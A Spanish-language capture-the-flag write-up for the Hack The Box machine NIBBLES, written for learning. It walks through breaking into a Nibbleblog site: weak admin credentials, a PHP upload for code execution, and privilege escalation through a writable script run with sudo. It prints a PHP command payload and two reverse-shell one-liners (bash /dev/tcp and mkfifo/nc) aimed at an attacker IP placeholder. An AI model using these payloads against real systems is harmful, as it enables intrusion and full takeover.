# NIBBLES

### 🔐Write-Up Técnico - Máquina NIBBLES (Hack The Box)

- Nombre de la máquina: NIBBLES
- Plataforma: Hack The Box
- Dificultad: Fácil
- Autora Write-Up: Marcela Jimenez
- Fecha: 10/04/2026

---
#### Resumen Ejecutivo 🧠

La máquina NIBBLES representa un escenario clásico de pentesting en entorno Linux donde se explotan vulnerabilidades en una aplicación web (Nibbleblog) para obtener acceso inicial y posteriormente escalar privilegios hasta usuario root mediante una mala configuración en sudo y permisos inseguros sobre archivos.

El ataque sigue tres fases principales:

- Enumeración y descubrimiento
- Explotación web (RCE)
- Escalada de privilegios

---
#### Enumeración Inicial 🔍

Se realizó un escaneo con Nmap identificando los siguientes servicios:

- Puerto 80 (HTTP) -> Aplicación web
- Puerto 22 (SSH) -> Acceso remoto

La superficie de ataque principal fue el servicio web.

---
#### Análisis de la Aplicación Web 🌐

Se identificó que el sitio utilizaba:

- CMS: Nibbleblog v4.0.3
- Lenguaje PHP
##### Hallazgos importantes:
- Directorio oculto: ```/nibbleblog```
- Panel de administración: ```/admin.php```
- Listado de directorios habilitado
- Archivos sensibles accesibles: 
   - ```users.xml``` -> usuario: admin
   - ```config.xml``` -> pistas de contraseña

---
#### Acceso Inicial 🔑

Mediante enumeración se identificaron credenciales válidas:

- Usuario: admin
- Contraseña: nibbles

Esto permitió acceso al panel de administración

---
#### Ejecución Remota de Código (RCE) 💣

Se detectó una vulnerabilidad en plugin *My Image* que permite subir archivos.

##### Explotación:

Se subió un archivo *PHP* malicioso

```bash
<?php system('id'); ?>
```

El archivo se almacenó en:

```/nibbleblog/content/private/plugins/my_image/image.php```

Esto permitió ejecutar comandos en el sistema.

---
#### Reverse Shell 🐚

Se reemplazó el payload por una reverse shell:

```bash
bash -i >& /dev/tcp/<IP_ATACANTE>/443 0>&1
```

---
#### Escalada de Privilegios 🔼

##### Paso 1: Descubrimiento

Se encontró el archivo:

```/home/nibbler/personal.zip```

Al descomprimir:

```bash
monitor.sh
```

---
##### Vulnerabilidad Crítica ⚠️

El usuario ```nibbler``` puede ejecutar el script con privilegios de root sin contraseña:

```bash 
sudo /home/nibbler/personal/stuff/monitor.sh
```

Y además:

- El archivo es *editable por el usuario*
- Se ejecuta como root

---
##### Paso 2: Explotación 💥

Se añadió una reverse shell al final del script:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP_ATACANTE> 8443 >/tmp/f
```

Ejecución 

```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

---
#### Resultado 🏁

Se obtiene shell como:

```bash
uid=0(root)
```

Acceso completo al sistema.

---
#### Cadena de Ataque Completa 🔗

```bash
Nmap → Web → Nibbleblog → Login → Upload → RCE → Reverse Shell → Sudo → Root
```

---
#### Vulnerabilidades Identificadas ⚠️

##### Exposición de Información Sensible
- Archivos accesibles: ```users.xml```, ```config.xml```
- Listado de directorios habilitado
##### Credenciales Débiles
- Uso de contraseña predecible: ```nibbles```
##### Vulnerabilidad de File Upload
- Plugin permite subir código PHP sin validación
##### Ejecución Remota de Código (RCE)
- Archivos ejecutables subidos en el servidor
##### Mala Configuración de Sudo
- Ejecución de script como root sin contraseña
##### Permisos Inseguros en Archivos
- Script ```monitor.sh``` editable por usuario no privilegiado

---
#### Recomendaciones de Seguridad 🛡️

#### 🔒 A nivel de aplicación web:

- Validar tipo de archivos en uploads
- Bloquear ejecución de PHP en directorios de subida
- Deshabilitar listado de directorios
- Eliminar archivos sensibles del acceso público

#### 🔑 Credenciales:

- Usar contraseñas robustas
- Implementar autenticación multifactor

#### ⚙️ Sistema:

- Revisar configuración de `sudo`
- Nunca permitir ejecución como root de archivos editables
- Aplicar principio de mínimo privilegio

#### 📁 Archivos:

- Restringir permisos de escritura
- Separar archivos ejecutables de datos

---
#### 🧠 Conclusión

La máquina **NIBBLES** demuestra cómo una cadena de fallos aparentemente simples puede llevar a una **comprometida total del sistema**.

El punto clave no fue una sola vulnerabilidad, sino la combinación de:

- Mala configuración
- Falta de validaciones
- Exposición de información

---

####  Lección Clave

> La enumeración detallada es la base del éxito en pentesting.  
> Cada pequeño detalle puede ser la clave para comprometer todo el sistema.

---

#### ✍️ Nota Personal

Este laboratorio refuerza la importancia de:

- Pensar de forma iterativa
- Analizar cada hallazgo
- Conectar información aparentemente irrelevante

---
